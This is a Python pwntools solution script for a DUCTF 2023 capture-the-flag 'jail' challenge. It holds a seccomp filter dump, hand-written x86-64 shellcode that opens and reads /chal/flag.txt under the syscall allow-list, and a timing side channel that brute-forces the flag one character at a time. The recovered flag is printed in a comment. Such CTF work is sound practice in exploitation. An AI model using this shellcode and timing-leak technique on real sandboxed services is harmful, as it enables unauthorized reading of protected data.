#!/usr/bin/env python3
from pwn import *
import time

BINARY_PATH = './jail'
REMOTE_HOST = '2023.ductf.dev'
REMOTE_PORT = 30010

exe = context.binary = ELF(BINARY_PATH)
#  context.log_level = "DEBUG"

#  if args.REMOTE:
    #  libc = ELF("./libc.so.6")
#  else:
    #  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(REMOTE_HOST, REMOTE_PORT, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
        #  return process(["strace", exe.path] + argv, *a, **kw)

gdbscript = '''
break main
continue
'''.format(**locals())

"""
jail[master*] $ seccomp-tools dump ./jail
   line  CODE  JT   JF      K
   =================================
   0000: 0x20 0x00 0x00 0x00000004  A = arch
   0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
   0002: 0x20 0x00 0x00 0x00000000  A = sys_number
   0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
   0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
   0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
   0006: 0x15 0x02 0x00 0x00000023  if (A == nanosleep) goto 0009
   0007: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0009
   0008: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0010
   0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
   0010: 0x06 0x00 0x00 0x00000000  return KILL
"""

def build_shellcode(index, char):
    shellcode = f"""
        /* push b'/chal/flag.txt\x00' */
        mov rax, 0x101010101010101
        push rax
        mov rax, 0x101010101010101 ^ 0x7478742e6761
        xor [rsp], rax
        mov rax, 0x6c662f6c6168632f
        push rax
        mov rsi, rsp

        /* openat(AT_FDCWD, "/chal/flag.txt", 0)
        /* call openat() */
        xor eax, eax
        mov ax, SYS_openat /* 0x101 */
        push -100 /* AT_FDCWD */
        pop rdi
        xor rdx, rdx /* 0 */
        syscall
        /* Save file descriptor for later */
        mov rbx, rax

        /* read(fd, stack, bytes) */
        mov rdi, rbx
        lea rsi, [rsp+1024]
        mov rdx, 0x7f
        xor rax, rax
        syscall

        /* rsi stores a pointer to the flag */
        /* we compare a character at a time, sleeping for 5s if we match
           so we can brute force a char at a time */
        mov al, byte [rsi-1+{index}]
        cmp al, {hex(ord(char))}
        je sleep_exit

        xor rdi, rdi
        push SYS_exit /* 0 */
        pop rax
        syscall

    sleep_exit:
        /* sleep for 5 seconds */
        push 0
        push 3
        mov rdi, rsp
        xor rsi, rsi
        push SYS_nanosleep
        pop rax
        syscall

        xor rdi, rdi
        push SYS_exit /* 0 */
        pop rax
        syscall
    """
    return shellcode

def check_char(index, char):
    io = start()
    io.recvuntil(b"> ")

    payload = asm(build_shellcode(index, char))
    if len(payload) > 126:
      raise StandardError("too long")

    start_time = time.time()
    io.sendline(payload)
    try:
        io.recvline()
    finally:
        end_time = time.time()
        if end_time-start_time > 2:
            print("Found match:", index, "=", char)
            return True

        io.shutdown()
        return False

def do_exploit():
    # we know it starts with DUCTF{ no reason to leak that
    for i in range(6, 50):
        for c in range(32, 127):
            matched = check_char(i, chr(c))
            if matched:
                break

"""
 Found match: 6 = S
 Found match: 7 = 1
 Found match: 8 = d
 Found match: 9 = e
?
Found match: 11 = C
Found match: 12 = h
Found match: 13 = @
Found match: 14 = n
Found match: 15 = N
Found match: 16 = 3
Found match: 17 = l
Found match: 18 = _
Found match: 19 = a
Found match: 20 = T
Found match: 21 = T
Found match: 22 = 4
Found match: 23 = c
Found match: 24 = k
Found match: 25 = S
Found match: 26 = _
Found match: 27 = a
Found match: 28 = R
Found match: 29 = e
Found match: 30 = _
Found match: 31 = P
Found match: 32 = r
Found match: 33 = 3
Found match: 34 = t
Found match: 35 = T
Found match: 36 = y
Found match: 37 = _
Found match: 38 = c
Found match: 39 = 0
Found match: 40 = 0
Found match: 41 = L
Found match: 42 = !
Found match: 43 = }
DUCTF{S1de_Ch@nN3l_aTT4ckS_aRe_Pr3tTy_c00L!}
"""

if __name__ == "__main__":
    do_exploit()
